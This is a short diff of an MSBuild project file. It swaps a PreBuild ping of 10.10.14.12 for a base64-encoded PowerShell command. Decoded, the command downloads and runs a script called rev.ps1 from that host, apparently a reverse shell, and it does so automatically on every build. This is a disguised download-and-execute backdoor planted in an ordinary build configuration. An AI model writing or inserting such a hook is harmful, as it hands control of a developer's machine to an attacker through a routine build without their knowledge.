@@ -9,7 +9,7 @@
   </PropertyGroup>
 
   <Target Name="PreBuild" AfterTargets="PreBuildEvent">
-    <Exec Command="ping -n 5 10.10.14.12" />
+    <Exec Command="powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMgAvAHIAZQB2AC4AcABzADEAIgApAAoA" />
   </Target>
 
 </Project>
